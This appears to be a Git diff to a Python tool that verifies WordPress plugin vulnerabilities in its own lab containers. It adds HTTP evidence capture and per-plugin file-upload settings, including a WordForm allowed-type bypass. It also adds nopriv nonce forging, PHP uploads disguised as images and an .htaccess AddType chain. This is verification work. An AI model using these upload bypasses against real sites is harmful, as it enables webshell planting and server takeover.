@@ -1136,17 +1136,49 @@ class _Lab:
 def _capture_exploit_shot(boot: "WpBootResult", method: str, endpoint: str,
                           resp_or_body, highlight: str, caption_es: str,
                           caption_en: str) -> None:
-    """Añade un screenshot HTTP del exploit confirmado a boot.shots.
+    """Añade un screenshot HTTP del exploit confirmado a boot.shots y captura HTTP estructurada.
     `resp_or_body` puede ser un objeto requests.Response o un str (body directo).
     Se llama justo después de confirmar la explotación en CUALQUIER clase de vuln."""
     try:
+        url = boot.base_url + endpoint
         if hasattr(resp_or_body, 'text'):
             status = resp_or_body.status_code
             body = (resp_or_body.text or "")[:6000]
+            # Captura HTTP estructurada (Burp-style)
+            req_obj = getattr(resp_or_body, 'request', None)
+            req_method = (req_obj.method if req_obj else method) or method
+            req_url    = (req_obj.url if req_obj else url) or url
+            req_body   = ""
+            req_headers: dict = {}
+            if req_obj:
+                raw_body = getattr(req_obj, 'body', None)
+                if isinstance(raw_body, bytes):
+                    req_body = raw_body.decode('utf-8', errors='replace')[:2000]
+                elif isinstance(raw_body, str):
+                    req_body = raw_body[:2000]
+                raw_hdrs = getattr(req_obj, 'headers', {}) or {}
+                req_headers = {k: v for k, v in raw_hdrs.items()
+                               if k.lower() not in ('cookie', 'authorization')}
+            resp_headers = {}
+            raw_resp_hdrs = getattr(resp_or_body, 'headers', {}) or {}
+            resp_headers = {k: v for k, v in raw_resp_hdrs.items()
+                            if k.lower() not in ('set-cookie',)}
+            boot.http_captures.append({
+                "caption_es": caption_es,
+                "caption_en": caption_en,
+                "method": req_method,
+                "url": req_url,
+                "request_headers": req_headers,
+                "request_body": req_body,
+                "response_status": status,
+                "response_reason": getattr(resp_or_body, 'reason', '') or '',
+                "response_headers": resp_headers,
+                "response_body": body,
+                "highlight": highlight,
+            })
         else:
             status = 200
             body = str(resp_or_body)[:6000]
-        url = boot.base_url + endpoint
         png = _screenshot_response(url, method, status, body, highlight=highlight, lang="es")
         if png:
             boot.shots.append({
@@ -1750,6 +1782,7 @@ class _LabSession:
     admin_sess: object         # requests.Session, autenticada como el admin CON SU PASSWORD ORIGINAL
     shots: list
     capture: Callable
+    http_captures: list = field(default_factory=list)
     shortcode_page_path: Optional[str] = None  # "/?page_id=N" de la pagina creada con el
     # shortcode real del plugin (si se pidio via shortcode_name) -- None si no se pidio o si
     # la creacion fallo.
@@ -2759,6 +2792,7 @@ def verify_wordpress_account_takeover(
                     "png_b64": old_pw_shot, "url": boot.base_url + "/wp-login.php",
                 })
             res.evidence["screenshots"] = boot.shots
+            res.evidence["http_captures"] = boot.http_captures
             return res
 
         # si no hay pass_param (solo email, p.ej.), confirma por wp-cli leyendo el email actual
@@ -2772,11 +2806,13 @@ def verify_wordpress_account_takeover(
             res.detail = (f"email del admin tras la peticion: {cur!r} "
                           f"(esperado: {new_email!r}) -> {'COINCIDE' if res.verified else 'no coincide'}")
             res.evidence["screenshots"] = boot.shots
+            res.evidence["http_captures"] = boot.http_captures
             return res
 
         res.ok = True
         res.detail = "la peticion se envio pero no se pudo confirmar el efecto (login posterior fallo)"
         res.evidence["screenshots"] = boot.shots
+        res.evidence["http_captures"] = boot.http_captures
         return res
     except subprocess.TimeoutExpired as e:
         res.detail = f"timeout de infraestructura: {e}"
@@ -2945,6 +2981,7 @@ def verify_wordpress_direct_login_as(
                           f"real exige un _wpnonce, incluyelo en 'parameters' (ver limitacion en "
                           f"el docstring de esta funcion)")
         res.evidence["screenshots"] = boot.shots
+        res.evidence["http_captures"] = boot.http_captures
         return res
     except subprocess.TimeoutExpired as e:
         res.detail = f"timeout de infraestructura: {e}"
@@ -3921,6 +3958,7 @@ def verify_wordpress_path_traversal(
                           f"'../', otra codificacion, o el endpoint/parametro no son los reales)" +
                           (f". Respuesta real del primer intento: {sample!r}" if sample else ""))
         res.evidence["screenshots"] = boot.shots
+        res.evidence["http_captures"] = boot.http_captures
         return res
     except subprocess.TimeoutExpired as e:
         res.detail = f"timeout de infraestructura: {e}"
@@ -4289,6 +4327,7 @@ def verify_wordpress_lfi(
                 f"rutas de log para LFI-a-RCE -- ninguno confirmo inclusion de fichero "
                 f"como codigo ni lectura de /etc/passwd o wp-config.php")
         res.evidence["screenshots"] = boot.shots
+        res.evidence["http_captures"] = boot.http_captures
         return res
     except subprocess.TimeoutExpired as e:
         res.detail = f"timeout de infraestructura: {e}"
@@ -4433,6 +4472,7 @@ def verify_wordpress_php_code_injection(
                           f"(puede que el endpoint necesite autenticacion, nonce especifico, o "
                           f"el parametro correcto no sea '{code_param}')")
         res.evidence["screenshots"] = boot.shots
+        res.evidence["http_captures"] = boot.http_captures
         return res
     except subprocess.TimeoutExpired as e:
         res.detail = f"timeout de infraestructura: {e}"
@@ -4634,6 +4674,7 @@ def verify_wordpress_command_injection(
                           f"se confirmo (puede necesitar otro separador de comandos, otro shell, "
                           f"o el endpoint/parametro no son los reales)")
         res.evidence["screenshots"] = boot.shots
+        res.evidence["http_captures"] = boot.http_captures
         return res
     except subprocess.TimeoutExpired as e:
         res.detail = f"timeout de infraestructura: {e}"
@@ -5267,6 +5308,7 @@ def verify_wordpress_sqli(
                 })
                 step(f"REQUEST_URI time-blind FALLO: {len(_uri_pairs)} pares sin retraso")
             res.evidence["screenshots"] = boot.shots
+            res.evidence["http_captures"] = boot.http_captures
             return res
 
         if boot.shortcode_page_path and attack_endpoint_is_bare_root:
@@ -6091,6 +6133,7 @@ def verify_wordpress_sqli(
                        f"Step 5b: SQL INJECTION (browser) -- rendered page showing MySQL error. "
                        f"Version extracted: {mysql_version}.")
             res.evidence["screenshots"] = boot.shots
+            res.evidence["http_captures"] = boot.http_captures
             return res
         # se guarda la lista COMPLETA de intentos (con el cuerpo real de cada respuesta), no solo
         # un resumen -- confirmado en vivo, CVE-2024-3552: sin esto, un negativo era indiagnosticable
@@ -6184,6 +6227,7 @@ def verify_wordpress_sqli(
                        f"Step 5b: SQL INJECTION (browser) -- response with real engine version "
                        f"({mysql_version}) extracted via UNION SELECT.")
             res.evidence["screenshots"] = boot.shots
+            res.evidence["http_captures"] = boot.http_captures
             return res
 
         res.evidence["union_intentos"] = union_tried
@@ -6286,6 +6330,7 @@ def verify_wordpress_sqli(
                             f"vs FALSE ({_false_len}B) differential in {consistent_diffs}/{len(pairs)} pairs."),
                 url=boot.base_url + endpoint)
             res.evidence["screenshots"] = boot.shots
+            res.evidence["http_captures"] = boot.http_captures
             return res
 
         # Content-diff boolean: cuando base_len es grande (>10KB) el threshold del 5% (>500B)
@@ -6398,6 +6443,7 @@ def verify_wordpress_sqli(
                     params=_poc_params, json_body=json_body, technique="boolean-blind SQLi (content-diff)",
                     description=f"Boolean-blind SQLi on '{sqli_param}': response body differs by exclusive tokens between TRUE/FALSE conditions. Replace TARGET with the real host.")
                 res.evidence["screenshots"] = boot.shots
+                res.evidence["http_captures"] = boot.http_captures
                 return res
 
         # ultimo recurso: time-based blind. Si el contenido/longitud de la respuesta nunca cambia
@@ -6749,6 +6795,7 @@ def verify_wordpress_sqli(
                         "url": boot.base_url + endpoint,
                     })
         res.evidence["screenshots"] = boot.shots
+        res.evidence["http_captures"] = boot.http_captures
         return res
     except subprocess.TimeoutExpired as e:
         step(f"TIMEOUT en verify_wordpress_sqli: {e}")
@@ -6937,6 +6984,7 @@ def verify_wordpress_ssrf(
                           f"que el endpoint/parametro no sean los reales, o que el servidor "
                           f"filtre de verdad las URLs internas antes de seguirlas)")
         res.evidence["screenshots"] = boot.shots
+        res.evidence["http_captures"] = boot.http_captures
         return res
     except subprocess.TimeoutExpired as e:
         res.detail = f"timeout de infraestructura: {e}"
@@ -7948,6 +7996,7 @@ def verify_wordpress_xss(
                 except Exception:
                     pass
         res.evidence["screenshots"] = boot.shots
+        res.evidence["http_captures"] = boot.http_captures
         return res
     except subprocess.TimeoutExpired as e:
         res.detail = f"timeout de infraestructura: {e}"
@@ -8095,6 +8144,7 @@ def verify_wordpress_ssti(
                           f"se confirmo (puede necesitar otra sintaxis de motor, o el "
                           f"endpoint/parametro no son los reales)")
         res.evidence["screenshots"] = boot.shots
+        res.evidence["http_captures"] = boot.http_captures
         return res
     except subprocess.TimeoutExpired as e:
         res.detail = f"timeout de infraestructura: {e}"
@@ -8312,6 +8362,7 @@ def verify_wordpress_xxe(
                           f"resolve_external_entities desactivado, o el endpoint/parametro no "
                           f"son los reales)")
         res.evidence["screenshots"] = boot.shots
+        res.evidence["http_captures"] = boot.http_captures
         return res
     except subprocess.TimeoutExpired as e:
         res.detail = f"timeout de infraestructura: {e}"
@@ -8456,6 +8507,7 @@ def verify_wordpress_open_redirect(
                 res.evidence["respuesta_cuerpo_recorte"] = (
                     f"status={first.get('status')} location={first.get('location')!r}")
         res.evidence["screenshots"] = boot.shots
+        res.evidence["http_captures"] = boot.http_captures
         return res
     except subprocess.TimeoutExpired as e:
         res.detail = f"timeout de infraestructura: {e}"
@@ -8467,6 +8519,164 @@ def verify_wordpress_open_redirect(
         _finalize_lab(lab, boot, res, step, keep_lab_on_failure)
 
 
+def _resolve_form_id_for_upload(boot, lab, slug: str, step) -> str:
+    """Extrae el ID numerico de un formulario desde la pagina del shortcode o via wp-cli.
+
+    Cubre plugins que almacenan sus formularios como custom post types (WordForm, WPForms,
+    Gravity Forms, CF7, Ninja Forms...) y cuyo campo de subida incluye el ID como parte del
+    nombre del campo (`wordform[{form_id}][upload][0][files]`).
+
+    Estrategias en orden:
+    1. Scrape de la pagina del shortcode: busca name="slug[NNN]..." en el HTML del formulario.
+    2. wp-cli: lista el primer post del CPT del plugin.
+    3. Crea un post del CPT via wp eval como último recurso y devuelve su ID."""
+    # 1. Scrape shortcode page HTML for name="slug[NNN]..." pattern
+    if getattr(boot, "shortcode_page_path", None):
+        try:
+            html = boot.sub_sess.get(boot.base_url + boot.shortcode_page_path, timeout=15).text
+            m = re.search(rf'name="{re.escape(slug)}\[(\d+)\]', html or "")
+            if m:
+                step(f"form_id={m.group(1)} extraido del HTML de la pagina del shortcode")
+                return m.group(1)
+        except Exception:
+            pass
+
+    # 2. wp-cli: first post of the plugin's CPT (tries several naming conventions)
+    _UPLOAD_PLUGIN_CPTS: dict = {
+        "wordform": "wordform",
+        "wpforms-lite": "wpforms", "wpforms": "wpforms",
+        "gravityforms": "gf_form",
+        "contact-form-7": "wpcf7_contact_form",
+        "ninja-forms": "nf_form",
+        "formidable": "frm_form",
+        "caldera-forms": "cf2",
+        "fluentform": "fluentform",
+        "everest-forms": "everest_form",
+    }
+    cpt_candidates = list(dict.fromkeys([
+        _UPLOAD_PLUGIN_CPTS.get(slug, ""),
+        slug,
+        f"{slug}_form",
+        f"{slug.replace('-', '_')}_form",
+    ]))
+    for cpt in cpt_candidates:
+        if not cpt:
+            continue
+        try:
+            r = lab.wp_cli("post", "list", f"--post_type={cpt}",
+                           "--format=ids", "--posts_per_page=1", timeout=10)
+            ids = (r.stdout or "").strip().split()
+            if ids and ids[0].isdigit():
+                step(f"form_id={ids[0]} extraido via wp-cli (post_type={cpt})")
+                return ids[0]
+        except Exception:
+            pass
+
+    # 3. Create a minimal form post via wp eval and return its ID
+    _cpt_create = _UPLOAD_PLUGIN_CPTS.get(slug, slug)
+    try:
+        r = lab.wp_cli("eval",
+                       f"echo wp_insert_post(['post_type'=>'{_cpt_create}',"
+                       f"'post_title'=>'binoracle test form','post_status'=>'publish']);",
+                       timeout=10)
+        fid = (r.stdout or "").strip()
+        if fid.isdigit() and int(fid) > 0:
+            step(f"form_id={fid} creado via wp eval (post_type={_cpt_create})")
+            return fid
+    except Exception:
+        pass
+
+    return ""
+
+
+# CPTs conocidos de plugins de subida -- usados por _resolve_form_id_for_upload y por
+# cve_agent.py para configurar shortcode_name y extra_upload_data automaticamente.
+_UPLOAD_FORM_PLUGIN_CONFIG: dict = {
+    # slug → {
+    #   "file_field_tpl"    : nombre del campo del fichero (puede tener {form_id})
+    #   "extra_upload_data" : datos POST adicionales (bypass, nombre, form ID, etc.)
+    #   "nonce_param"       : clave del nonce en la peticion POST
+    #   "nonce_action"      : accion real de wp_create_nonce() / check_ajax_referer()
+    #   "ajax_action"       : valor del campo 'action' para wp-admin/admin-ajax.php
+    #   "shortcode_name"    : nombre del shortcode para crear la pagina de prueba
+    # }
+    # nopriv=True → la accion es accesible sin autenticacion (wp_ajax_nopriv_*); el ataque
+    # usara una sesion anonima en vez de boot.sub_sess, y el nonce se generara para uid=0.
+    # El nonce de un usuario autenticado no valida para uid=0 y viceversa.
+    "wordform": {
+        # El campo real del form HTML es 'files[]' (array): name="wordform[ID][upload][KEY][files][]"
+        # Con 'files[]', $_FILES crea un array → merge correcto → array_filter no falla en PHP 8.
+        "file_field_tpl": "wordform[{form_id}][upload][0][files][]",
+        "extra_upload_data": {
+            # bypass: fileAllowed vacío → wp_check_filetype devuelve '' que está en la allowed_list ['']
+            "wordform[{form_id}][upload][0][fileAllowed]": "",
+            "WordFormID": "{form_id}",
+        },
+        "nonce_param":    "security",
+        "nonce_action":   "scwordform_wpnonce",   # check_ajax_referer('scwordform_wpnonce', 'security')
+        "ajax_action":    "sc_wordform_created_form_submission",
+        "shortcode_name": "wordform",
+        "nopriv":         True,  # add_action('wp_ajax_nopriv_...') → no login required
+    },
+    "wpforms-lite": {
+        "file_field_tpl": "wpforms[fields][{form_id}]",
+        "nonce_param":    "wpforms[nonce]",
+        "nonce_action":   "wpforms::submit",
+        "ajax_action":    "wpforms_submit",
+        "shortcode_name": "wpforms",
+        "nopriv":         True,
+    },
+    "wpforms": {
+        "file_field_tpl": "wpforms[fields][{form_id}]",
+        "nonce_param":    "wpforms[nonce]",
+        "nonce_action":   "wpforms::submit",
+        "ajax_action":    "wpforms_submit",
+        "shortcode_name": "wpforms",
+        "nopriv":         True,
+    },
+    "ninja-forms": {
+        "file_field_tpl": "nf_fields[{form_id}][value]",
+        "nonce_param":    "_wpnonce",
+        "nonce_action":   "nf_ajax_submit",
+        "ajax_action":    "nf_ajax_submit",
+        "shortcode_name": "ninja_form",
+        "nopriv":         True,
+    },
+    "formidable": {
+        "file_field_tpl": "item_meta[{form_id}]",
+        "nonce_param":    "frm_submit_entry_nonce",
+        "nonce_action":   "frm_submit_entry_nonce",
+        "ajax_action":    "frm_entries_create",
+        "shortcode_name": "formidable",
+        "nopriv":         True,
+    },
+    "gravityforms": {
+        "file_field_tpl": "input_{form_id}_1",
+        "nonce_param":    "gform_field_values",
+        "nonce_action":   "gform_submit_{form_id}",
+        "ajax_action":    "rg_save_progress",
+        "shortcode_name": "gravityforms",
+        "nopriv":         True,
+    },
+    "contact-form-7": {
+        "file_field_tpl": "file-{form_id}",
+        "nonce_param":    "_wpnonce",
+        "nonce_action":   "file-{form_id}",
+        "ajax_action":    "wpcf7_submit",
+        "shortcode_name": "contact-form-7",
+        "nopriv":         True,
+    },
+    "everest-forms": {
+        "file_field_tpl": "everest_forms[form_fields][{form_id}]",
+        "nonce_param":    "_wpnonce",
+        "nonce_action":   "everest_forms_process_submit",
+        "ajax_action":    "everest_forms",
+        "shortcode_name": "everest_form",
+        "nopriv":         True,
+    },
+}
+
+
 def verify_wordpress_file_upload(
     plugin_source_dir: str, slug: str, endpoint: str, http_method: str,
     parameters, file_param_hint: str = "",
@@ -8476,6 +8686,8 @@ def verify_wordpress_file_upload(
     extra_setup_trigger_paths: Optional[list] = None,
     shortcode_name: Optional[str] = None,
     keep_lab_on_failure: bool = False,
+    file_field_tpl: str = "",
+    extra_upload_data: Optional[dict] = None,
 ) -> WpVerifyResult:
     """Verifica unrestricted file upload (webshell) en dos pasos, ambos con prueba dura:
 
@@ -8487,7 +8699,18 @@ def verify_wordpress_file_upload(
        esa ruta, y se pide. Si la respuesta contiene la SUMA calculada (y no el codigo PHP fuente
        sin ejecutar), es prueba de que el fichero subido se EJECUTA como PHP, no solo que se
        guardo -- un servidor que solo almacena el fichero devolveria el codigo fuente literal, que
-       no contiene ese numero en ningun punto."""
+       no contiene ese numero en ningun punto.
+
+    file_field_tpl: plantilla para el campo del fichero cuando el plugin usa una estructura
+        anidada en vez de un campo plano (p.ej. WordForm: 'wordform[{form_id}][upload][0][files]',
+        WPForms: 'wpforms[fields][{form_id}]'). {form_id} se resuelve automaticamente raspando
+        la pagina del shortcode o via wp-cli. Si vacio, se usa file_param_hint/parameters.
+
+    extra_upload_data: datos POST adicionales que van junto a cada intento de subida. Pueden
+        contener {form_id} y {filename} como marcadores. Usados para bypassar validaciones que
+        leen la lista de tipos permitidos del POST en vez de de la configuracion del servidor
+        (ej. WordForm: 'wordform[{form_id}][upload][0][fileAllowed]'='' → la validacion siempre
+        devuelve True porque wp_check_filetype devuelve '' que esta en la allowed_list [''])."""
     step = on_step or (lambda _m: None)
     pre = _check_prereqs(plugin_source_dir, slug)
     if pre is not None:
@@ -8495,12 +8718,42 @@ def verify_wordpress_file_upload(
     res = WpVerifyResult()
     t0 = time.time()
 
+    # Si el slug tiene una configuracion conocida de campo anidado, autoconfigura los parametros
+    # que no se hayan pasado explicitamente (el analista siempre tiene prioridad).
+    _slug_cfg = _UPLOAD_FORM_PLUGIN_CONFIG.get(slug, {})
+    if not file_field_tpl and _slug_cfg.get("file_field_tpl"):
+        file_field_tpl = _slug_cfg["file_field_tpl"]
+    if extra_upload_data is None and _slug_cfg.get("extra_upload_data"):
+        extra_upload_data = dict(_slug_cfg["extra_upload_data"])
+    if not shortcode_name and _slug_cfg.get("shortcode_name"):
+        shortcode_name = _slug_cfg["shortcode_name"]
+    _nonce_param_cfg  = _slug_cfg.get("nonce_param", "")
+    _nonce_action_cfg = _slug_cfg.get("nonce_action", "")  # accion real para wp_create_nonce
+    _ajax_action_cfg  = _slug_cfg.get("ajax_action", "")   # valor de 'action' para admin-ajax.php
+    _nopriv_cfg       = bool(_slug_cfg.get("nopriv", False))  # True → nopriv: sesion anonima + nonce uid=0
+
+    # Nonce param autoconfig: lo añadimos a base_params para que _auto_resolve_wp_blockers
+    # lo rellene via scraping/eval. Si luego resolvemos form_id y conocemos la nonce_action
+    # exacta, el nonce se sobreescribe con un valor generado directamente via wp-cli.
+    _auto_nonce_inject: dict = {}
+    if _nonce_param_cfg and not any(_nonce_param_cfg in str(p) for p in (parameters or [])):
+        _auto_nonce_inject = {_nonce_param_cfg: ""}
+    # Action param autoconfig: admin-ajax.php necesita 'action' en el POST; si no viene de
+    # los params del analista ni de la hipotesis del LLM, lo inyectamos del config del plugin.
+    _auto_action_inject: dict = {}
+    if _ajax_action_cfg:
+        _params_flat = " ".join(str(p) for p in (parameters or []))
+        if "action" not in _params_flat:
+            _auto_action_inject = {"action": _ajax_action_cfg}
+
     file_param = file_param_hint or _pick_param(parameters, _FILE_UPLOAD_HINTS)
-    if not file_param:
+    # Si se usa file_field_tpl, no hace falta file_param: el campo del fichero viene del template.
+    if not file_param and not file_field_tpl:
         res.detail = "no se identifico el parametro (campo de formulario) del fichero subido"
         res.limitations.append("la verificacion de file-upload necesita saber que campo lleva el "
-                               "fichero; afina 'parameters' en la hipotesis del LLM o pasalo a "
-                               "mano (file_param_hint)")
+                               "fichero; afina 'parameters' en la hipotesis del LLM, usa "
+                               "file_param_hint, o define file_field_tpl para plugins con "
+                               "estructura de campo anidada (WordForm, WPForms, etc.)")
         return res
 
     lab = _Lab(_token())
@@ -8535,10 +8788,78 @@ def verify_wordpress_file_upload(
             ("binoracle_{t}.png", b"\x89PNG\r\n\x1a\n", "image/png"),    # polyglot PNG + PHP
         ]
         base_params = dict(parameters) if isinstance(parameters, dict) else dict.fromkeys(parameters or [], "")
+        # Inyectar nonce y action del plugin si se autoconfiguraron y no vienen ya en parameters.
+        base_params.update({k: v for k, v in _auto_nonce_inject.items() if k not in base_params})
+        base_params.update({k: v for k, v in _auto_action_inject.items() if k not in base_params})
         endpoint, base_params = _auto_resolve_wp_blockers(
-            boot, lab, slug, m, endpoint, base_params, file_param, res, step,
+            boot, lab, slug, m, endpoint, base_params, file_param or "", res, step,
             extra_nonce_pages=extra_nonce_pages)
         other_params = {k: v for k, v in base_params.items() if k != file_param}
+
+        # ── Resolución de form_id para plugins con campo de subida anidado ───────────────────
+        # Cuando file_field_tpl o extra_upload_data contienen {form_id}, lo resolvemos aquí
+        # una vez (scrape de la pagina del shortcode → wp-cli CPT → wp eval create).
+        _form_id = ""
+        _needs_form_id = (
+            (file_field_tpl and "{form_id}" in file_field_tpl) or
+            any("{form_id}" in str(v) or "{form_id}" in str(k)
+                for k, v in (extra_upload_data or {}).items())
+        )
+        if _needs_form_id:
+            _form_id = _resolve_form_id_for_upload(boot, lab, slug, step)
+            if not _form_id:
+                step("[WARN] form_id no resuelto -- usando '1' como fallback")
+                _form_id = "1"
+
+        # ── Override de nonce + sesion para acciones nopriv ──────────────────────────────────
+        # _auto_resolve_wp_blockers puede haber capturado un nonce incorrecto (admin bar,
+        # WP REST API…). Si conocemos la nonce_action exacta del plugin, generamos el nonce
+        # correcto via wp-cli y lo sobreescribimos en base_params/other_params.
+        #
+        # CLAVE: en WordPress los nonces son session-specific. Para acciones nopriv (cualquier
+        # visitante sin cuenta puede explotarlas), el nonce debe generarse para uid=0 (sin sesion)
+        # Y el ataque debe enviarse con una sesion ANONIMA (sin la cookie del subscriber) --
+        # de lo contrario wp_verify_nonce usaria la sesion del subscriber y el nonce uid=0 fallaria.
+        # Para acciones auth (subscriber o superior), no se hace override aqui: el nonce se raspa
+        # de las paginas cargadas por la sesion del subscriber, que es correcto.
+        _attack_sess = None   # None → usar boot.sub_sess (default); requests.Session → sesion anonima
+        if _nonce_action_cfg and _nonce_param_cfg:
+            try:
+                _nonce_action_real = _nonce_action_cfg.replace("{form_id}", _form_id)
+                _r_fn = lab.wp_cli("eval",
+                                   f"wp_set_current_user(0); "
+                                   f"echo wp_create_nonce('{_nonce_action_real}');",
+                                   timeout=10)
+                _fresh_nonce = (_r_fn.stdout or "").strip()
+                if _fresh_nonce and re.match(r'^[0-9a-f]{8,20}$', _fresh_nonce):
+                    _old_nonce = base_params.get(_nonce_param_cfg, "(ninguno)")
+                    base_params[_nonce_param_cfg] = _fresh_nonce
+                    other_params[_nonce_param_cfg] = _fresh_nonce
+                    step(f"nonce '{_nonce_action_real}' generado via wp-cli "
+                         f"(sobreescribe nonce incorrecto raspado: "
+                         f"{str(_old_nonce)[:8]}…→{_fresh_nonce[:8]}…)")
+                    res.evidence["nonce_override_via_wp_cli"] = {
+                        "action": _nonce_action_real, "value": _fresh_nonce}
+                    if _nopriv_cfg:
+                        # Sesion anonima: no lleva cookies → uid=0 → el nonce uid=0 valida
+                        import requests as _rq
+                        _attack_sess = _rq.Session()
+                        _attack_sess.headers["User-Agent"] = "binoracle/lab-anon"
+                        step("sesion ANONIMA (sin cookie de subscriber): el ataque es nopriv "
+                             "→ no necesita autenticacion, uid=0 en server == uid=0 del nonce")
+            except Exception:
+                pass
+
+        def _subst(s: str, fname: str = "") -> str:
+            return s.replace("{form_id}", _form_id).replace("{filename}", fname)
+
+        # Campo del fichero: si se pasó un template, lo usamos; si no, el file_param plano.
+        _actual_file_field = _subst(file_field_tpl) if file_field_tpl else (file_param or "file")
+        # Datos bypass adicionales: se sustituyen los marcadores por cada intento.
+        _extra_upload_resolved: dict = {
+            _subst(k): _subst(v) if isinstance(v, str) else v
+            for k, v in (extra_upload_data or {}).items()
+        } if extra_upload_data else {}
         res.evidence.update({
             "login_bajo_privilegio": boot.sub_user, "login_bajo_privilegio_password": boot.sub_pass,
             "file_param": file_param, "metodo": m, "endpoint": endpoint,
@@ -8552,19 +8873,31 @@ def verify_wordpress_file_upload(
             a, b = secrets.randbelow(8000) + 1000, secrets.randbelow(8000) + 1000
             expected = a + b
             php_payload = magic + f"<?php echo {a}+{b}; ?>".encode()
-            step(f"subiendo '{fname}' con {file_param} (magic bytes={magic!r}, contenido PHP "
-                 f"que calcula {a}+{b})...")
+            step(f"subiendo '{fname}' via campo '{_actual_file_field}' "
+                 f"(magic bytes={magic!r}, contenido PHP que calcula {a}+{b})...")
+            # extra_upload_data puede tener {filename}: sustituir por el nombre real del intento
+            _extra_per_attempt = {
+                _subst(k, fname): _subst(v, fname) if isinstance(v, str) else v
+                for k, v in _extra_upload_resolved.items()
+            }
+            _sess_to_use = _attack_sess if _attack_sess is not None else boot.sub_sess
             try:
-                resp = boot.sub_sess.request(
-                    m, boot.base_url + endpoint, data=other_params,
-                    files={file_param: (fname, php_payload, content_type)}, timeout=20)
+                resp = _sess_to_use.request(
+                    m, boot.base_url + endpoint,
+                    data={**other_params, **_extra_per_attempt},
+                    files={_actual_file_field: (fname, php_payload, content_type)}, timeout=20)
             except Exception as e:
                 tried.append({"filename": fname, "error_subida": str(e)})
                 continue
             found_path = lab.find_in_webroot(token)
+            _resp_snippet = (resp.text or "")[:200].replace("\n", " ").strip()
             entry = {"filename": fname, "status_subida": resp.status_code,
-                    "encontrado_en_contenedor": found_path}
+                    "encontrado_en_contenedor": found_path,
+                    "file_field_usado": _actual_file_field,
+                    "respuesta_servidor": _resp_snippet}
             if not found_path:
+                if _resp_snippet:
+                    step(f"  → {resp.status_code} · respuesta: {_resp_snippet!r}")
                 tried.append(entry)
                 continue
             rel = found_path.replace("/var/www/html", "", 1)
@@ -8616,10 +8949,15 @@ def verify_wordpress_file_upload(
             step("ninguna variante directa funciono; probando la cadena .htaccess (AddType) + "
                  "imagen con el payload...")
             htaccess_body = b"AddType application/x-httpd-php .jpg\n"
+            _ht_extra = {
+                _subst(k, ".htaccess"): _subst(v, ".htaccess") if isinstance(v, str) else v
+                for k, v in _extra_upload_resolved.items()
+            }
             try:
-                r_ht = boot.sub_sess.request(
-                    m, boot.base_url + endpoint, data=other_params,
-                    files={file_param: (".htaccess", htaccess_body, "text/plain")}, timeout=20)
+                r_ht = _sess_to_use.request(
+                    m, boot.base_url + endpoint, data={**other_params, **_ht_extra},
+                    files={_actual_file_field: (".htaccess", htaccess_body, "text/plain")},
+                    timeout=20)
                 htaccess_evidence = {"status_subida_htaccess": r_ht.status_code}
             except Exception as e:
                 htaccess_evidence = {"error_subida_htaccess": str(e)}
@@ -8631,10 +8969,15 @@ def verify_wordpress_file_upload(
                 php_payload = f"<?php echo {a}+{b}; ?>".encode()
                 step(f"subiendo '{fname}' tras el .htaccess (deberia ejecutarse como PHP si el "
                      f".htaccess se respeto)...")
+                _ht_jpg_extra = {
+                    _subst(k, fname): _subst(v, fname) if isinstance(v, str) else v
+                    for k, v in _extra_upload_resolved.items()
+                }
                 try:
-                    resp = boot.sub_sess.request(
-                        m, boot.base_url + endpoint, data=other_params,
-                        files={file_param: (fname, php_payload, "image/jpeg")}, timeout=20)
+                    resp = _sess_to_use.request(
+                        m, boot.base_url + endpoint, data={**other_params, **_ht_jpg_extra},
+                        files={_actual_file_field: (fname, php_payload, "image/jpeg")},
+                        timeout=20)
                     found_path = lab.find_in_webroot(token)
                     if found_path:
                         rel = found_path.replace("/var/www/html", "", 1)
@@ -8683,6 +9026,7 @@ def verify_wordpress_file_upload(
                           f"verdad la extension/el tipo MIME/el contenido, o el campo/endpoint no "
                           f"sean los reales)")
         res.evidence["screenshots"] = boot.shots
+        res.evidence["http_captures"] = boot.http_captures
         return res
     except subprocess.TimeoutExpired as e:
         res.detail = f"timeout de infraestructura: {e}"
@@ -8778,6 +9122,7 @@ def verify_wordpress_plugin_install_rce(
                           f"de ninguna pagina del sitio -- sin nonce la peticion falla siempre "
                           f"(wp_verify_nonce), con o sin bug real detras")
             res.evidence["screenshots"] = boot.shots
+            res.evidence["http_captures"] = boot.http_captures
             return res
         res.evidence.update({
             "login_bajo_privilegio": boot.sub_user, "login_bajo_privilegio_password": boot.sub_pass,
@@ -8800,6 +9145,7 @@ def verify_wordpress_plugin_install_rce(
         except Exception as e:
             res.detail = f"error de red subiendo el ZIP: {e}"
             res.evidence["screenshots"] = boot.shots
+            res.evidence["http_captures"] = boot.http_captures
             return res
         res.evidence["status_subida"] = resp.status_code
         res.evidence["respuesta_subida_recorte"] = (resp.text or "")[:500]
@@ -8813,6 +9159,7 @@ def verify_wordpress_plugin_install_rce(
                           f"(capability real, validacion del ZIP, o el handler/accion no son los "
                           f"reales), no se confirma RCE")
             res.evidence["screenshots"] = boot.shots
+            res.evidence["http_captures"] = boot.http_captures
             return res
         rel = found_path.replace("/var/www/html", "", 1)
         candidate_url = boot.base_url + rel
@@ -8822,6 +9169,7 @@ def verify_wordpress_plugin_install_rce(
         except Exception as e:
             res.detail = f"ZIP instalado en {found_path} pero error de red al pedirlo: {e}"
             res.evidence["screenshots"] = boot.shots
+            res.evidence["http_captures"] = boot.http_captures
             return res
         pattern = re.compile(rf"(?<!\d){expected}(?!\d)")
         executed = bool(pattern.search(r2.text or ""))
@@ -8860,6 +9208,7 @@ def verify_wordpress_plugin_install_rce(
                           f"confirma que el PHP se ejecute (puede que WordPress bloquee la "
                           f"ejecucion de PHP en wp-content/plugins por configuracion del servidor)")
         res.evidence["screenshots"] = boot.shots
+        res.evidence["http_captures"] = boot.http_captures
         return res
     except subprocess.TimeoutExpired as e:
         res.detail = f"timeout de infraestructura: {e}"
@@ -9027,6 +9376,7 @@ def verify_wordpress_csrf(
                           f"SI compruebe nonce/origen, o que el payload/endpoint no sean los "
                           f"reales)")
         res.evidence["screenshots"] = boot.shots
+        res.evidence["http_captures"] = boot.http_captures
         return res
     except subprocess.TimeoutExpired as e:
         res.detail = f"timeout de infraestructura: {e}"
